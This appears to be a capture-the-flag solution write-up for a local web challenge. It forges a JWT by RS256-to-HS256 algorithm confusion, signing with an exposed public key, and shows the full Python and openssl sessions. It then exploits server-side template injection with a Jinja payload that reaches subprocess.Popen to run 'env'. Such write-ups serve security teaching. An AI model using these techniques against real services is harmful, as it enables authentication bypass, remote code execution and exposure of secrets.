# Solution

There are two hidden endpoints that can be easily revealed with any scanner/crawler:
- `robots.txt` (points to `/client`)
- `/client`

The `/client` endpoint contains a public key that can be used to sign a JWT token that web application gives to the user. In addition to signing with public key, participants must change the JWT algorithm from `RS256` to `HS256`. 

To create a valid signature, take your current JWT and change its contents:
```python
$ python3
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> jwt = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJwcm8iOmZhbHNlfQ.dYFNOteZMwTzVsUFLOfDfLCvKm16i28baOKNDCkv1s3CXnf4rUcnovzLGimk9xwKL3NauxgDkrRviX0BP-0bGdqQe3KNem6DB-s3U9uFFiqxyZiDOzo8R9vZNu9v2dWhnls52mHX1rTMUjumW7z2yj8yP0xr0w0mNNdbd-MK3SvhcmkKewibI0vJk1Uv01l03K0bhINJRkDGOn_WI5ygBje7sfTaIffYBBiKfkooReLfRuQrGhldeO2snR_UHUpZFuKn9PvE3Ejn7LQl4en-ZqxgWGivp-H6QT8G3-lfNaWJJBeq4wRkYXXSLxRIahlZHOKrqiSbFC-fIa1ff9gCaA'
>>> parts = jwt.split('.')
>>> from base64 import b64decode, b64encode
>>> b64decode(parts[0])
b'{"typ":"JWT","alg":"RS256"}'
>>> b64decode(parts[1])
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.8/base64.py", line 87, in b64decode
    return binascii.a2b_base64(s)
binascii.Error: Incorrect padding
>>> b64decode(parts[1]+'==')
b'{"user":"guest","pro":false}'
>>> b64encode('{"typ":"JWT","alg":"HS256"}')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.8/base64.py", line 58, in b64encode
    encoded = binascii.b2a_base64(s, newline=False)
TypeError: a bytes-like object is required, not 'str'
>>> b64encode(b'{"typ":"JWT","alg":"HS256"}')
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'
>>> b64encode(b'{"user":"guest","pro":true}')
b'eyJ1c2VyIjoiZ3Vlc3QiLCJwcm8iOnRydWV9'
```

We are now only missing the signature which can be recreated with the extracted public key from `/client`:

```sh
$ curl -sS http://localhost:8080/client | xxd -p | tr -d '\n'
2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541753331593658514c626b787172554c48594972540a6b31706f304a652b6d59316557356879726a7650535530654a48384249655367716c68585a384b37344f5433654d345657316e494276724a613179647a446f480a546c41762b68356a33764b424b6c426c695a2f2b596f4c75617243617746566851514e42615767345751792f3574584f56327253474d537933544156505848590a58534e302f5749663376517445795273794b357a7a6d4341752f634142444b574c2f674f692f567753685252457735304f3571667a41624354597a4953546e500a69446546414e51354a30745a76472f633139306351385234344d7a66636345387753474379354a4347484b4a6757694d6d556c74654b582b4d71615368344c470a4773677230647270515450462f39492f78506b33676c3461324256495663355769717944512f7a6a5166476c416730614f2f7237544c385262332b6951386c540a30774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a```
$ echo -n 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJwcm8iOnRydWV9' | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541753331593658514c626b787172554c48594972540a6b31706f304a652b6d59316557356879726a7650535530654a48384249655367716c68585a384b37344f5433654d345657316e494276724a613179647a446f480a546c41762b68356a33764b424b6c426c695a2f2b596f4c75617243617746566851514e42615767345751792f3574584f56327253474d537933544156505848590a58534e302f5749663376517445795273794b357a7a6d4341752f634142444b574c2f674f692f567753685252457735304f3571667a41624354597a4953546e500a69446546414e51354a30745a76472f633139306351385234344d7a66636345387753474379354a4347484b4a6757694d6d556c74654b582b4d71615368344c470a4773677230647270515450462f39492f78506b33676c3461324256495663355769717944512f7a6a5166476c416730614f2f7237544c385262332b6951386c540a30774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
(stdin)= 7c05b1cea3d841b6cc4536bc34d25b86a4c8f1cd3d5ed1fc73c29c9af1016693
$ python3 -c 'from base64 import b64encode; from binascii import unhexlify; print(b64encode(unhexlify("7c05b1cea3d841b6cc4536bc34d25b86a4c8f1cd3d5ed1fc73c29c9af1016693")))'
b'fAWxzqPYQbbMRTa8NNJbhqTI8c09XtH8c8KcmvEBZpM='
```

Which makes our forged token as:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJwcm8iOnRydWV9.fAWxzqPYQbbMRTa8NNJbhqTI8c09XtH8c8KcmvEBZpM
```

The JWT token must be set as a session cookie to obtain access to the search functionality.

When search is available, player should recognize that it is vulnerable to server side template injection. 

This is easily verified by inputting `{{ 7*7 }}` which will output `49` as your search parameter.

The server side template injection can be then used to leverage remote code execution via call to `subprocess.Popen` (your index may vary):

```
{{ ''.__class__.__mro__[1].__subclasses__()[273]('env',shell=True,stdout=-1).communicate() }}
```
